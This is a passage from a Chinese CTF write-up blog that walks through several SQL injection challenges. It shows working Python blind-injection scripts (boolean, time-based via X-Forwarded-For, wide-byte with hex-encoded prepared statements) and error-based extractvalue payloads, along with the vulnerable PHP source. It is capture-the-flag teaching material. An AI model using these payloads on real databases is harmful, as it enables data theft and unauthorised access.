class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)='geek')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/iOdeEnDWUwNK8V3.png" alt=""></p><p>查列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)='F1naI1y')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/DTSb4nMyjg6e89R.png" alt=""></p><p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p><p>查字段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>拿到flag：</p><p><img src="https://i.loli.net/2020/03/27/RvGOsyKqSXYNEug.png" alt=""></p><h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p><p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://i.loli.net/2020/03/27/irSKxC2d6QBnVu7.png" alt="image-20200323203842474" style="zoom:50%;" /><p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php" target="_blank" rel="noopener">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p><p>先fuzz一下，以下字符被过滤：</p><img src="https://i.loli.net/2020/03/27/FnfpO9AMlex8UdC.png" alt="image-20200323204336331" style="zoom: 80%;" /><p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p><p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p><p>推测后端sql语句变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'1\'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">' or 1#'</span></span><br></pre></td></tr></table></figure><p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p><img src="D:\Blog\source\_posts\SQL注入.assets\image-20200323205329926.png" alt="image-20200323205329926" style="zoom: 50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line">pass1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        pass1 = <span class="string">'0x5E'</span> + passwd.replace(<span class="string">'0x5E'</span>,<span class="string">''</span>) + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">        payload = <span class="string">' or password regexp binary &#123;&#125;#'</span>.format(pass1)</span><br><span class="line">        <span class="comment">#print(pass1)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'1\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=header)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BJD needs'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p><p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p><p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p><p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p><p>在题目的下方给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">不如写个Python吧</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p><img src="https://i.loli.net/2020/03/27/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" /><p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p><p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p><p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p><p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p><p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-"</span></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = <span class="string">"此处为Payload"</span>.format(i,j)</span><br><span class="line">        header = &#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            print(j,end = <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">"select * from flllllllag where id=$id"</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p><p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p><img src="https://i.loli.net/2020/03/27/gKbs6mkaDcpUx5W.png" alt="image-20200224085735781" style="zoom: 80%;" /><p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p><p>regexp后所跟的东西作为正则表达式处理。</p><p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>于是写出盲注注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com/?id="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j&lt;<span class="number">58</span> <span class="keyword">or</span> j&gt;<span class="number">96</span>:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">            d = <span class="string">"1 and if(ascii(mid(fl4g,"</span>+str(i)+<span class="string">",1))regexp "</span>+str(j)+<span class="string">",sleep(3),1)"</span></span><br><span class="line">            r = requests.get(url+d)</span><br><span class="line">            <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">                print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">参考1</a> ，<a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">参考2</a></p><p>界面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p><p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p><p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p><p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),{},1))= {},sleep(3),1)</code></p><p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),{},1))= {},sleep(3),1)</code></p><p>写出盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com/?id="</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"(This is Payload)"</span>.format(i,j)</span><br><span class="line">        payload = str_to_hex(d)</span><br><span class="line">        a = <span class="string">"%df%27;set @a=0x&#123;&#125;;prepare a from @a; execute a;"</span>.format(payload)</span><br><span class="line">        r = requests.get(url+a)</span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p><h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p><p><img src="https://i.loli.net/2020/03/27/g86QP1C5ZsThjan.png" alt="image-20200202210221397"></p><p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p><p><img src="https://i.loli.net/2020/03/27/Lg3nIbUrDZ6AY4R.png" alt="image-20200202205759631"></p><p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p><p><img src="https://i.loli.net/2020/03/27/4cPp1rotWQnUvew.png" alt="image-20200202210316197"></p><p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p><p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p><p>查库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/KDtnXxQcPvYRGV6.png" alt="image-20200202211050460"></p><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)=database()))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/YvlyLpUX7qZESNP.png" alt="image-20200202211144570"></p><p>由此可知flag应该在f14g中</p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)=char(102,49,52,103)))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/hIfBtkgzYT4qNOa.png" alt="image-20200202211316925"></p><blockquote><p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p></blockquote><p>解密MD5值后为id</p><p>id列查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/9wQR4Un3pDref1W.png" alt="image-20200202213216347"></p><p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p><p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flag列查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/xoZzpbPdajKuqD3.png" alt="image-20200202213850482"></p><p>base64解密后为“The first man name was k”。。。。。。。。。。</p><p>配合limit进行查询，在limit 22,1处发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/PXqxeEV3Hvp7cRw.png" alt="image-20200202215549648"></p><p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p><p>于是用到substr()函数进行字符串的截取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/Qo3SelyJVt6qbkM.png" alt="image-20200202215649430"></p><p>去掉相同的拼合起来base64解码后即可得到flag</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p><p><img src="https://i.loli.net/2020/03/27/FUeKLit8HApfNOP.png" alt="image-20200202202456358"></p><p>题目给出的提示：</p><p><img src="https://i.loli.net/2020/03/27/53qyMpFJAaSEcBz.png" alt="image-20200202202740164"></p><p>随便登录后在前端HTML中都能看到这样一串字母</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span 